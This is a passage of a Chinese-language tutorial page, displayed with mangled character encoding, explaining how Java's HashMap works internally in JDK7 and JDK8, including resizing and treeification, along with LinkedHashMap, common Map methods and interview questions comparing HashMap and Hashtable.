<h5 id="HashMapåœ¨JDK7ä¸­çš„åº•å±‚å®ç°åŸç†"><a href="#HashMapåœ¨JDK7ä¸­çš„åº•å±‚å®ç°åŸç†" class="headerlink" title="HashMapåœ¨JDK7ä¸­çš„åº•å±‚å®ç°åŸç†"></a>HashMapåœ¨JDK7ä¸­çš„åº•å±‚å®ç°åŸç†</h5><ul>
<li>HashMapçš„å†…éƒ¨å­˜å‚¨ç»“æ„å…¶å®æ˜¯<strong>æ•°ç»„å’Œé“¾è¡¨çš„ç»“åˆ</strong>ã€‚å½“å®ä¾‹åŒ–ä¸€ä¸ªHashMapæ—¶ï¼Œç³»ç»Ÿä¼šåˆ›å»ºä¸€ä¸ªé•¿åº¦ä¸ºCapacityçš„Entryæ•°ç»„ï¼Œè¿™ä¸ªé•¿åº¦åœ¨å“ˆå¸Œè¡¨ä¸­è¢«ç§°ä¸ºå®¹é‡(Capacity)ï¼Œåœ¨è¿™ä¸ªæ•°ç»„ä¸­å¯ä»¥å­˜æ”¾å…ƒç´ çš„ä½ç½®æˆ‘ä»¬ç§°ä¹‹ä¸ºâ€œæ¡¶â€(bucket)ï¼Œæ¯ä¸ªbucketéƒ½æœ‰è‡ªå·±çš„ç´¢å¼•ï¼Œç³»ç»Ÿå¯ä»¥æ ¹æ®ç´¢å¼•å¿«é€Ÿçš„æŸ¥æ‰¾bucketä¸­çš„å…ƒç´ ã€‚</li>
<li>æ¯ä¸ªbucketä¸­å­˜å‚¨ä¸€ä¸ªå…ƒç´ ï¼Œå³ä¸€ä¸ªEntryå¯¹è±¡ï¼Œä½†æ¯ä¸€ä¸ªEntryå¯¹è±¡å¯ä»¥å¸¦ä¸€ä¸ªå¼•ç”¨å˜é‡ï¼Œç”¨äºæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå› æ­¤ï¼Œåœ¨ä¸€ä¸ªæ¡¶ä¸­ï¼Œå°±æœ‰å¯èƒ½ç”Ÿæˆä¸€ä¸ªEntryé“¾ã€‚è€Œä¸”æ–°æ·»åŠ çš„å…ƒç´ ä½œä¸ºé“¾è¡¨çš„headã€‚</li>
<li>æ·»åŠ å…ƒç´ çš„è¿‡ç¨‹ï¼š<ul>
<li>å‘HashMapä¸­æ·»åŠ entry1(keyï¼Œvalue)ï¼Œéœ€è¦é¦–å…ˆè®¡ç®—entry1ä¸­keyçš„å“ˆå¸Œå€¼(æ ¹æ®keyæ‰€åœ¨ç±»çš„hashCode()è®¡ç®—å¾—åˆ°)ï¼Œæ­¤å“ˆå¸Œå€¼ç»è¿‡å¤„ç†ä»¥åï¼Œå¾—åˆ°åœ¨åº•å±‚Entry[]æ•°ç»„ä¸­è¦å­˜å‚¨çš„ä½ç½®iã€‚å¦‚æœä½ç½®iä¸Šæ²¡æœ‰å…ƒç´ ï¼Œåˆ™entry1ç›´æ¥æ·»åŠ æˆåŠŸã€‚å¦‚æœä½ç½®iä¸Šå·²ç»å­˜åœ¨entry2(æˆ–è¿˜æœ‰é“¾è¡¨å­˜åœ¨çš„entry3ï¼Œentry4)ï¼Œåˆ™éœ€è¦é€šè¿‡å¾ªç¯çš„æ–¹æ³•ï¼Œä¾æ¬¡æ¯”è¾ƒentry1ä¸­keyå’Œå…¶ä»–çš„entryã€‚å¦‚æœå½¼æ­¤hashå€¼ä¸åŒï¼Œåˆ™ç›´æ¥æ·»åŠ æˆåŠŸã€‚å¦‚æœhashå€¼ä¸åŒï¼Œç»§ç»­æ¯”è¾ƒäºŒè€…æ˜¯å¦equalsã€‚å¦‚æœè¿”å›å€¼ä¸ºtrueï¼Œåˆ™ä½¿ç”¨entry1çš„valueå»æ›¿æ¢equalsä¸ºtrueçš„entryçš„valueã€‚å¦‚æœéå†ä¸€éä»¥åï¼Œå‘ç°æ‰€æœ‰çš„equalsè¿”å›éƒ½ä¸ºfalse,åˆ™entry1ä»å¯æ·»åŠ æˆåŠŸã€‚entry1æŒ‡å‘åŸæœ‰çš„entryå…ƒç´ ã€‚</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ä¸‰ã€HashMapçš„åº•å±‚å®ç°åŸç†ï¼Ÿä»¥jdk7ä¸ºä¾‹è¯´æ˜ï¼š</span></span><br><span class="line"><span class="comment"> *    HashMap map = new HashMap():</span></span><br><span class="line"><span class="comment"> *    åœ¨å®ä¾‹åŒ–ä»¥åï¼Œåº•å±‚åˆ›å»ºäº†é•¿åº¦æ˜¯16çš„ä¸€ç»´æ•°ç»„Entry[] tableã€‚</span></span><br><span class="line"><span class="comment"> *    ...å¯èƒ½å·²ç»æ‰§è¡Œè¿‡å¤šæ¬¡put...</span></span><br><span class="line"><span class="comment"> *    map.put(key1,value1):</span></span><br><span class="line"><span class="comment"> *    é¦–å…ˆï¼Œè°ƒç”¨key1æ‰€åœ¨ç±»çš„hashCode()è®¡ç®—key1å“ˆå¸Œå€¼ï¼Œæ­¤å“ˆå¸Œå€¼ç»è¿‡æŸç§ç®—æ³•è®¡ç®—ä»¥åï¼Œå¾—åˆ°åœ¨Entryæ•°ç»„ä¸­çš„å­˜æ”¾ä½ç½®ã€‚</span></span><br><span class="line"><span class="comment"> *    å¦‚æœæ­¤ä½ç½®ä¸Šçš„æ•°æ®ä¸ºç©ºï¼Œæ­¤æ—¶çš„key1-value1æ·»åŠ æˆåŠŸã€‚ ----æƒ…å†µ1</span></span><br><span class="line"><span class="comment"> *    å¦‚æœæ­¤ä½ç½®ä¸Šçš„æ•°æ®ä¸ä¸ºç©ºï¼Œ(æ„å‘³ç€æ­¤ä½ç½®ä¸Šå­˜åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®(ä»¥é“¾è¡¨å½¢å¼å­˜åœ¨)),æ¯”è¾ƒkey1å’Œå·²ç»å­˜åœ¨çš„ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®</span></span><br><span class="line"><span class="comment"> *    çš„å“ˆå¸Œå€¼ï¼š</span></span><br><span class="line"><span class="comment"> *           å¦‚æœkey1çš„å“ˆå¸Œå€¼ä¸å·²ç»å­˜åœ¨çš„æ•°æ®çš„å“ˆå¸Œå€¼éƒ½ä¸ç›¸åŒï¼Œæ­¤æ—¶key1-value1æ·»åŠ æˆåŠŸã€‚----æƒ…å†µ2</span></span><br><span class="line"><span class="comment"> *           å¦‚æœkey1çš„å“ˆå¸Œå€¼å’Œå·²ç»å­˜åœ¨çš„æŸä¸€ä¸ªæ•°æ®(key2-value2)çš„å“ˆå¸Œå€¼ç›¸åŒï¼Œç»§ç»­æ¯”è¾ƒï¼šè°ƒç”¨key1æ‰€åœ¨ç±»çš„equals(key2)æ–¹æ³•ï¼Œæ¯”è¾ƒï¼š</span></span><br><span class="line"><span class="comment"> *                å¦‚æœequals()è¿”å›false:æ­¤æ—¶key1-value1æ·»åŠ æˆåŠŸã€‚----æƒ…å†µ3</span></span><br><span class="line"><span class="comment"> *                å¦‚æœequals()è¿”å›true:ä½¿ç”¨value1æ›¿æ¢value2ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   è¡¥å……ï¼šå…³äºæƒ…å†µ2å’Œæƒ…å†µ3ï¼šæ­¤æ—¶key1-value1å’ŒåŸæ¥çš„æ•°æ®ä»¥é“¾è¡¨çš„æ–¹å¼å­˜å‚¨ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   åœ¨ä¸æ–­çš„æ·»åŠ è¿‡ç¨‹ä¸­ï¼Œä¼šæ¶‰åŠåˆ°æ‰©å®¹é—®é¢˜ï¼Œå½“è¶…å‡ºä¸´ç•Œå€¼(ä¸”è¦å­˜æ”¾çš„ä½ç½®éç©º)æ—¶ï¼Œæ‰©å®¹ã€‚é»˜è®¤çš„æ‰©å®¹æ–¹å¼ï¼šæ‰©å®¹ä¸ºåŸæ¥å®¹é‡çš„2å€ï¼Œå¹¶å°†åŸæœ‰çš„æ•°æ®å¤åˆ¶è¿‡æ¥ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * HashMapçš„æ‰©å®¹</span></span><br><span class="line"><span class="comment">  *     å½“HashMapä¸­çš„å…ƒç´ è¶Šæ¥è¶Šå¤šçš„æ—¶å€™ï¼Œhashå†²çªçš„å‡ ç‡ä¹Ÿå°±è¶Šæ¥è¶Šé«˜ï¼Œ</span></span><br><span class="line"><span class="comment">  *     å› ä¸ºæ•°ç»„çš„é•¿åº¦æ˜¯å›ºå®šçš„ã€‚æ‰€ä»¥ä¸ºäº†æé«˜æŸ¥è¯¢çš„æ•ˆç‡ï¼Œ</span></span><br><span class="line"><span class="comment">  *     å°±è¦å¯¹HashMapçš„æ•°ç»„è¿›è¡Œæ‰©å®¹ï¼Œè€Œåœ¨HashMapæ•°ç»„æ‰©å®¹ä¹‹åï¼Œ</span></span><br><span class="line"><span class="comment">  *     æœ€æ¶ˆè€—æ€§èƒ½çš„ç‚¹å°±å‡ºç°äº†ï¼šåŸæ•°ç»„ä¸­çš„æ•°æ®å¿…é¡»é‡æ–°è®¡ç®—å…¶åœ¨æ–°æ•°ç»„ä¸­çš„ä½ç½®ï¼Œ</span></span><br><span class="line"><span class="comment">  *     å¹¶æ”¾è¿›å»ï¼Œè¿™å°±æ˜¯resizeã€‚</span></span><br><span class="line"><span class="comment">  *     </span></span><br><span class="line"><span class="comment">  * é‚£ä¹ˆHashMapä»€ä¹ˆæ—¶å€™è¿›è¡Œæ‰©å®¹å‘¢ï¼Ÿ</span></span><br><span class="line"><span class="comment">  *      å½“HashMapä¸­çš„å…ƒç´ ä¸ªæ•°è¶…è¿‡æ•°ç»„å¤§å°(æ•°ç»„æ€»å¤§å°length,</span></span><br><span class="line"><span class="comment">  *      ä¸æ˜¯æ•°ç»„ä¸­ä¸ªæ•°size)*loadFactoræ—¶ï¼Œå°± ä¼š è¿› è¡Œ æ•° ç»„ æ‰© å®¹ï¼Œ</span></span><br><span class="line"><span class="comment">  *      loadFactorçš„é»˜è®¤å€¼(DEFAULT_LOAD_FACTOR)ä¸º0.75ï¼Œè¿™æ˜¯ä¸€ä¸ªæŠ˜ä¸­çš„å–å€¼ã€‚</span></span><br><span class="line"><span class="comment">  *      ä¹Ÿå°±æ˜¯è¯´ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæ•°ç»„å¤§å°(DEFAULT_INITIAL_CAPACITY)ä¸º16ï¼Œ</span></span><br><span class="line"><span class="comment">  *      é‚£ä¹ˆå½“HashMapä¸­å…ƒç´ ä¸ªæ•°è¶…è¿‡16*0.75=12ï¼ˆè¿™ä¸ªå€¼å°±æ˜¯ä»£ç ä¸­çš„thresholdå€¼ï¼Œ</span></span><br><span class="line"><span class="comment">  *      ä¹Ÿå«åšä¸´ç•Œå€¼ï¼‰çš„æ—¶å€™ï¼Œå°±æŠŠæ•°ç»„çš„å¤§å°æ‰©å±•ä¸º2*16=32ï¼Œå³æ‰©å¤§ä¸€å€ï¼Œ</span></span><br><span class="line"><span class="comment">  *      ç„¶åé‡æ–°è®¡ç®—æ¯ä¸ªå…ƒç´ åœ¨æ•°ç»„ä¸­çš„ä½ç½®ï¼Œè€Œè¿™æ˜¯ä¸€ä¸ªéå¸¸æ¶ˆè€—æ€§èƒ½çš„æ“ä½œï¼Œ</span></span><br><span class="line"><span class="comment">  *      æ‰€ä»¥å¦‚æœæˆ‘ä»¬å·²ç»é¢„çŸ¥HashMapä¸­å…ƒç´ çš„ä¸ªæ•°ï¼Œ</span></span><br><span class="line"><span class="comment">  *      é‚£ä¹ˆé¢„è®¾å…ƒç´ çš„ä¸ªæ•°èƒ½å¤Ÿæœ‰æ•ˆçš„æé«˜HashMapçš„æ€§èƒ½ã€‚</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure>

<h5 id="HashMapåœ¨JDK8ä¸­çš„åº•å±‚å®ç°åŸç†"><a href="#HashMapåœ¨JDK8ä¸­çš„åº•å±‚å®ç°åŸç†" class="headerlink" title="HashMapåœ¨JDK8ä¸­çš„åº•å±‚å®ç°åŸç†"></a>HashMapåœ¨JDK8ä¸­çš„åº•å±‚å®ç°åŸç†</h5><ul>
<li><p>HashMapçš„å†…éƒ¨å­˜å‚¨ç»“æ„å…¶å®æ˜¯æ•°ç»„+é“¾è¡¨+æ ‘çš„ç»“åˆã€‚å½“å®ä¾‹åŒ–ä¸€ä¸ªHashMapæ—¶ï¼Œä¼šåˆå§‹åŒ–initialCapacityå’ŒloadFactorï¼Œåœ¨putç¬¬ä¸€å¯¹æ˜ å°„å…³ç³»æ—¶ï¼Œç³»ç»Ÿä¼šåˆ›å»ºä¸€ä¸ªé•¿åº¦ä¸ºinitialCapacityçš„Nodeæ•°ç»„ï¼Œè¿™ä¸ªé•¿åº¦åœ¨å“ˆå¸Œè¡¨ä¸­è¢«ç§°ä¸ºå®¹é‡(Capacity)ï¼Œåœ¨è¿™ä¸ªæ•°ç»„ä¸­å¯ä»¥å­˜æ”¾å…ƒç´ çš„ä½ç½®æˆ‘ä»¬ç§°ä¹‹ä¸ºâ€œæ¡¶â€(bucket)ï¼Œæ¯ä¸ªbucketéƒ½æœ‰è‡ªå·±çš„ç´¢å¼•ï¼Œç³»ç»Ÿå¯ä»¥æ ¹æ®ç´¢å¼•å¿«é€Ÿçš„æŸ¥æ‰¾bucketä¸­çš„å…ƒç´ ã€‚</p>
</li>
<li><p>æ¯ä¸ªbucketä¸­å­˜å‚¨ä¸€ä¸ªå…ƒç´ ï¼Œå³ä¸€ä¸ªNodeå¯¹è±¡ï¼Œä½†æ¯ä¸€ä¸ªNodeå¯¹è±¡å¯ä»¥å¸¦ä¸€ä¸ªå¼•ç”¨å˜é‡nextï¼Œç”¨äºæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå› æ­¤ï¼Œåœ¨ä¸€ä¸ªæ¡¶ä¸­ï¼Œå°±æœ‰å¯èƒ½ç”Ÿæˆä¸€ä¸ªNodeé“¾ã€‚ä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªä¸€ä¸ªTreeNodeå¯¹è±¡ï¼Œæ¯ä¸€ä¸ªTreeNodeå¯¹è±¡å¯ä»¥æœ‰ä¸¤ä¸ªå¶å­ç»“ç‚¹leftå’Œrightï¼Œå› æ­¤ï¼Œåœ¨ä¸€ä¸ªæ¡¶ä¸­ï¼Œå°±æœ‰å¯èƒ½ç”Ÿæˆä¸€ä¸ªTreeNodeæ ‘ã€‚è€Œæ–°æ·»åŠ çš„å…ƒç´ ä½œä¸ºé“¾è¡¨çš„lastï¼Œæˆ–æ ‘çš„å¶å­ç»“ç‚¹ã€‚</p>
</li>
<li><p><strong>é‚£ä¹ˆHashMapä»€ä¹ˆæ—¶å€™è¿›è¡Œæ‰©å®¹å’Œæ ‘å½¢åŒ–å‘¢ï¼Ÿ</strong></p>
<blockquote>
<p>å½“HashMapä¸­çš„å…ƒç´ ä¸ªæ•°è¶…è¿‡æ•°ç»„å¤§å°(æ•°ç»„æ€»å¤§å°length,ä¸æ˜¯æ•°ç»„ä¸­ä¸ªæ•°size)<em>loadFactoræ—¶ï¼Œå°±ä¼šè¿›è¡Œæ•°ç»„æ‰©å®¹ï¼ŒloadFactorçš„é»˜è®¤å€¼(DEFAULT_LOAD_FACTOR)ä¸º0.75ï¼Œè¿™æ˜¯ä¸€ä¸ªæŠ˜ä¸­çš„å–å€¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæ•°ç»„å¤§å°(DEFAULT_INITIAL_CAPACITY)ä¸º16ï¼Œé‚£ä¹ˆå½“HashMapä¸­å…ƒç´ ä¸ªæ•°è¶…è¿‡16</em>0.75&#x3D;12ï¼ˆè¿™ä¸ªå€¼å°±æ˜¯ä»£ç ä¸­çš„thresholdå€¼ï¼Œä¹Ÿå«åšä¸´ç•Œå€¼ï¼‰çš„æ—¶å€™ï¼Œå°±æŠŠæ•°ç»„çš„å¤§å°æ‰©å±•ä¸º2*16&#x3D;32ï¼Œå³æ‰©å¤§ä¸€å€ï¼Œç„¶åé‡æ–°è®¡ç®—æ¯ä¸ªå…ƒç´ åœ¨æ•°ç»„ä¸­çš„ä½ç½®ï¼Œè€Œè¿™æ˜¯ä¸€ä¸ªéå¸¸æ¶ˆè€—æ€§èƒ½çš„æ“ä½œï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å·²ç»é¢„çŸ¥HashMapä¸­å…ƒç´ çš„ä¸ªæ•°ï¼Œé‚£ä¹ˆé¢„è®¾å…ƒç´ çš„ä¸ªæ•°èƒ½å¤Ÿæœ‰æ•ˆçš„æé«˜HashMapçš„æ€§èƒ½ã€‚</p>
</blockquote>
</li>
<li><p>å½“HashMapä¸­çš„å…¶ä¸­ä¸€ä¸ªé“¾çš„å¯¹è±¡ä¸ªæ•°å¦‚æœè¾¾åˆ°äº†8ä¸ªï¼Œæ­¤æ—¶å¦‚æœcapacityæ²¡æœ‰è¾¾åˆ°64ï¼Œé‚£ä¹ˆHashMapä¼šå…ˆæ‰©å®¹è§£å†³ï¼Œå¦‚æœå·²ç»è¾¾åˆ°äº†64ï¼Œé‚£ä¹ˆè¿™ä¸ªé“¾ä¼šå˜æˆæ ‘ï¼Œç»“ç‚¹ç±»å‹ç”±Nodeå˜æˆTreeNodeç±»å‹ã€‚å½“ç„¶ï¼Œå¦‚æœå½“æ˜ å°„å…³ç³»è¢«ç§»é™¤åï¼Œä¸‹æ¬¡resizeæ–¹æ³•æ—¶åˆ¤æ–­æ ‘çš„ç»“ç‚¹ä¸ªæ•°ä½äº6ä¸ªï¼Œä¹Ÿä¼šæŠŠæ ‘å†è½¬ä¸ºé“¾è¡¨ã€‚</p>
</li>
<li><p><strong>å…³äºæ˜ å°„å…³ç³»çš„keyæ˜¯å¦å¯ä»¥ä¿®æ”¹ï¼Ÿanswerï¼šä¸è¦ä¿®æ”¹</strong></p>
<blockquote>
<p>æ˜ å°„å…³ç³»å­˜å‚¨åˆ°HashMapä¸­ä¼šå­˜å‚¨keyçš„hashå€¼ï¼Œè¿™æ ·å°±ä¸ç”¨åœ¨æ¯æ¬¡æŸ¥æ‰¾æ—¶é‡æ–°è®¡ç®—æ¯ä¸€ä¸ªEntryæˆ–Nodeï¼ˆTreeNodeï¼‰çš„hashå€¼äº†ï¼Œå› æ­¤å¦‚æœå·²ç»putåˆ°Mapä¸­çš„æ˜ å°„å…³ç³»ï¼Œå†ä¿®æ”¹keyçš„å±æ€§ï¼Œè€Œè¿™ä¸ªå±æ€§åˆå‚ä¸hashcodeå€¼çš„è®¡ç®—ï¼Œé‚£ä¹ˆä¼šå¯¼è‡´åŒ¹é…ä¸ä¸Šã€‚</p>
</blockquote>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* æ€»ç»“ï¼š</span></span><br><span class="line"><span class="comment"> *   jdk8 ç›¸è¾ƒäºjdk7åœ¨åº•å±‚å®ç°æ–¹é¢çš„ä¸åŒï¼š</span></span><br><span class="line"><span class="comment"> *      1.new HashMap():åº•å±‚æ²¡æœ‰åˆ›å»ºä¸€ä¸ªé•¿åº¦ä¸º16çš„æ•°ç»„</span></span><br><span class="line"><span class="comment"> *      2.jdk 8åº•å±‚çš„æ•°ç»„æ˜¯ï¼šNode[],è€ŒéEntry[]</span></span><br><span class="line"><span class="comment"> *      3.é¦–æ¬¡è°ƒç”¨put()æ–¹æ³•æ—¶ï¼Œåº•å±‚åˆ›å»ºé•¿åº¦ä¸º16çš„æ•°ç»„</span></span><br><span class="line"><span class="comment"> *      4.jdk7åº•å±‚ç»“æ„åªæœ‰ï¼šæ•°ç»„+é“¾è¡¨ã€‚jdk8ä¸­åº•å±‚ç»“æ„ï¼šæ•°ç»„+é“¾è¡¨+çº¢é»‘æ ‘ã€‚</span></span><br><span class="line"><span class="comment"> *         4.1å½¢æˆé“¾è¡¨æ—¶ï¼Œä¸ƒä¸Šå…«ä¸‹ï¼ˆjdk7:æ–°çš„å…ƒç´ æŒ‡å‘æ—§çš„å…ƒç´ ã€‚jdk8ï¼šæ—§çš„å…ƒç´ æŒ‡å‘æ–°çš„å…ƒç´ ï¼‰</span></span><br><span class="line"><span class="comment"> *         4.2å½“æ•°ç»„çš„æŸä¸€ä¸ªç´¢å¼•ä½ç½®ä¸Šçš„å…ƒç´ ä»¥é“¾è¡¨å½¢å¼å­˜åœ¨çš„æ•°æ®ä¸ªæ•° &gt; 8 ä¸”å½“å‰æ•°ç»„çš„é•¿åº¦ &gt; 64æ—¶ï¼Œæ­¤æ—¶æ­¤ç´¢å¼•ä½ç½®ä¸Šçš„æ‰€æ•°æ®æ”¹ä¸ºä½¿ç”¨çº¢é»‘æ ‘å­˜å‚¨ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h4 id="LinkedHashMapçš„åº•å±‚å®ç°åŸç†ï¼ˆäº†è§£ï¼ï¼ï¼ï¼‰"><a href="#LinkedHashMapçš„åº•å±‚å®ç°åŸç†ï¼ˆäº†è§£ï¼ï¼ï¼ï¼‰" class="headerlink" title="LinkedHashMapçš„åº•å±‚å®ç°åŸç†ï¼ˆäº†è§£ï¼ï¼ï¼ï¼‰"></a>LinkedHashMapçš„åº•å±‚å®ç°åŸç†ï¼ˆäº†è§£ï¼ï¼ï¼ï¼‰</h4><ul>
<li><p>LinkedHashMapæ˜¯HashMapçš„å­ç±»</p>
</li>
<li><p>åœ¨HashMapå­˜å‚¨ç»“æ„çš„åŸºç¡€ä¸Šï¼Œä½¿ç”¨äº†ä¸€å¯¹åŒå‘é“¾è¡¨æ¥è®°å½•æ·»åŠ å…ƒç´ çš„é¡ºåº</p>
</li>
<li><p>ä¸LinkedHashSetç±»ä¼¼ï¼ŒLinkedHashMapå¯ä»¥ç»´æŠ¤Map çš„è¿­ä»£é¡ºåºï¼šè¿­ä»£é¡ºåºä¸Key-Value å¯¹çš„æ’å…¥é¡ºåºä¸€è‡´</p>
</li>
<li><p>HashMapä¸­çš„å†…éƒ¨ç±»ï¼šNode</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/5def8a853d13145aec0fac58b21ec825--dc6e--image-20240926161107656.png" alt="image-20240926161107656"></p>
<ul>
<li>LinkedHashMapä¸­çš„å†…éƒ¨ç±»ï¼šEntry</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/a74194cb166be60b7c14d33841288421--a599--image-20240926161127564.png" alt="image-20240926161127564"></p>
<h4 id="Mapä¸­çš„å¸¸ç”¨æ–¹æ³•"><a href="#Mapä¸­çš„å¸¸ç”¨æ–¹æ³•" class="headerlink" title="Mapä¸­çš„å¸¸ç”¨æ–¹æ³•"></a>Mapä¸­çš„å¸¸ç”¨æ–¹æ³•</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  äº”ã€Mapä¸­å®šä¹‰çš„æ–¹æ³•ï¼š</span></span><br><span class="line"><span class="comment"> *      æ·»åŠ ã€åˆ é™¤ã€ä¿®æ”¹æ“ä½œï¼š</span></span><br><span class="line"><span class="comment"> *      Object put(Object key,Object value)ï¼šå°†æŒ‡å®škey-valueæ·»åŠ åˆ°(æˆ–ä¿®æ”¹)å½“å‰mapå¯¹è±¡ä¸­</span></span><br><span class="line"><span class="comment"> *      void putAll(Map m):å°†mä¸­çš„æ‰€æœ‰key-valueå¯¹å­˜æ”¾åˆ°å½“å‰mapä¸­</span></span><br><span class="line"><span class="comment"> *      Object remove(Object key)ï¼šç§»é™¤æŒ‡å®škeyçš„key-valueå¯¹ï¼Œå¹¶è¿”å›value</span></span><br><span class="line"><span class="comment"> *      void clear()ï¼šæ¸…ç©ºå½“å‰mapä¸­çš„æ‰€æœ‰æ•°æ®</span></span><br><span class="line"><span class="comment"> *      å…ƒç´ æŸ¥è¯¢çš„æ“ä½œï¼š</span></span><br><span class="line"><span class="comment"> *      Object get(Object key)ï¼šè·å–æŒ‡å®škeyå¯¹åº”çš„value</span></span><br><span class="line"><span class="comment"> *      boolean containsKey(Object key)ï¼šæ˜¯å¦åŒ…å«æŒ‡å®šçš„key</span></span><br><span class="line"><span class="comment"> *      boolean containsValue(Object value)ï¼šæ˜¯å¦åŒ…å«æŒ‡å®šçš„value</span></span><br><span class="line"><span class="comment"> *      int size()ï¼šè¿”å›mapä¸­key-valueå¯¹çš„ä¸ªæ•°</span></span><br><span class="line"><span class="comment"> *      boolean isEmpty()ï¼šåˆ¤æ–­å½“å‰mapæ˜¯å¦ä¸ºç©º</span></span><br><span class="line"><span class="comment"> *      boolean equals(Object obj)ï¼šåˆ¤æ–­å½“å‰mapå’Œå‚æ•°å¯¹è±¡objæ˜¯å¦ç›¸ç­‰</span></span><br><span class="line"><span class="comment"> *      å…ƒè§†å›¾æ“ä½œçš„æ–¹æ³•ï¼š</span></span><br><span class="line"><span class="comment"> *      Set keySet()ï¼šè¿”å›æ‰€æœ‰keyæ„æˆçš„Seté›†åˆ</span></span><br><span class="line"><span class="comment"> *      Collection values()ï¼šè¿”å›æ‰€æœ‰valueæ„æˆçš„Collectioné›†åˆ</span></span><br><span class="line"><span class="comment"> *      Set entrySet()ï¼šè¿”å›æ‰€æœ‰key-valueå¯¹æ„æˆçš„Seté›†åˆ</span></span><br><span class="line"><span class="comment"> *æ€»ç»“ï¼šå¸¸ç”¨æ–¹æ³•ï¼š</span></span><br><span class="line"><span class="comment"> *    æ·»åŠ ï¼šput(Object key,Object value)</span></span><br><span class="line"><span class="comment"> *    åˆ é™¤ï¼šremove(Object key)</span></span><br><span class="line"><span class="comment"> *    ä¿®æ”¹ï¼šput(Object key,Object value)</span></span><br><span class="line"><span class="comment"> *    æŸ¥è¯¢ï¼šget(Object key)</span></span><br><span class="line"><span class="comment"> *    é•¿åº¦ï¼šsize()</span></span><br><span class="line"><span class="comment"> *    éå†ï¼škeySet() / values() / entrySet()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  é¢è¯•é¢˜ï¼š</span></span><br><span class="line"><span class="comment"> *  1. HashMapçš„åº•å±‚å®ç°åŸç†ï¼Ÿ</span></span><br><span class="line"><span class="comment"> *  2. HashMap å’Œ Hashtableçš„å¼‚åŒï¼Ÿ</span></span><br><span class="line"><span class="comment"> *      1.HashMapä¸Hashtableéƒ½å®ç°äº†Mapæ¥å£ã€‚ç”±äºHashMapçš„éçº¿ç¨‹å®‰å…¨æ€§ï¼Œæ•ˆç‡ä¸Šå¯èƒ½é«˜äºHashtableã€‚Hashtableçš„æ–¹æ³•æ˜¯Synchronizeçš„ï¼Œè€ŒHashMapä¸æ˜¯ï¼Œåœ¨å¤šä¸ªçº¿ç¨‹è®¿é—®Hashtableæ—¶ï¼Œä¸éœ€è¦è‡ªå·±ä¸ºå®ƒçš„æ–¹æ³•å®ç°åŒæ­¥ï¼Œè€ŒHashMap å°±å¿…é¡»ä¸ºä¹‹æä¾›å¤–åŒæ­¥ã€‚</span></span><br><span class="line"><span class="comment"> *      2.HashMapå…è®¸å°†nullä½œä¸ºä¸€ä¸ªentryçš„keyæˆ–è€…valueï¼Œè€ŒHashtableä¸å…è®¸ã€‚</span></span><br><span class="line"><span class="comment"> *      3.HashMapæŠŠHashtableçš„containsæ–¹æ³•å»æ‰äº†ï¼Œæ”¹æˆcontainsvalueå’ŒcontainsKeyã€‚å› ä¸ºcontainsæ–¹æ³•å®¹æ˜“è®©äººå¼•èµ·è¯¯è§£ã€‚</span></span><br><span class="line"><span class="comment"> *      4.Hashtableç»§æ‰¿è‡ªDictionaryç±»ï¼Œè€ŒHashMapæ˜¯Java1.2å¼•è¿›çš„Map interfaceçš„ä¸€ä¸ªå®ç°ã€‚</span></span><br><span class="line"><span class="comment"> *      5.Hashtableå’ŒHashMapé‡‡ç”¨çš„hash/rehashç®—æ³•éƒ½å¤§æ¦‚ä¸€æ ·ï¼Œæ‰€ä»¥æ€§èƒ½ä¸ä¼šæœ‰å¾ˆå¤§çš„å·®å¼‚ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  3. CurrentHashMap ä¸ Hashtableçš„å¼‚åŒï¼Ÿï¼ˆæš‚æ—¶ä¸è®²ï¼‰</span></span><br><span class="line"><span class="comment"> *</span></span><br></pre></td></tr></table></figure>

<h4 id="TreeMapä¸¤ç§æ·»åŠ æ–¹å¼çš„ä½¿ç”¨"><a href="#TreeMapä¸¤ç§æ·»åŠ æ–¹å¼çš„ä½¿ç”¨" class="headerlink" title="TreeMapä¸¤ç§æ·»åŠ æ–¹å¼çš„ä½¿ç”¨"></a>TreeMapä¸¤ç§æ·»åŠ æ–¹å¼çš„ä½¿ç”¨</h4><ul>
<li>TreeMapå­˜å‚¨Key-Value å¯¹æ—¶ï¼Œéœ€è¦æ ¹æ®key-value å¯¹è¿›è¡Œæ’åºã€‚TreeMapå¯ä»¥ä¿è¯æ‰€æœ‰çš„Key-Value å¯¹å¤„äº<strong>æœ‰åº</strong>çŠ¶æ€ã€‚</li>
<li>TreeSetåº•å±‚ä½¿ç”¨<strong>çº¢é»‘æ ‘</strong>ç»“æ„å­˜å‚¨æ•°æ®</li>
<li>TreeMapçš„Key çš„æ’åºï¼š<ul>
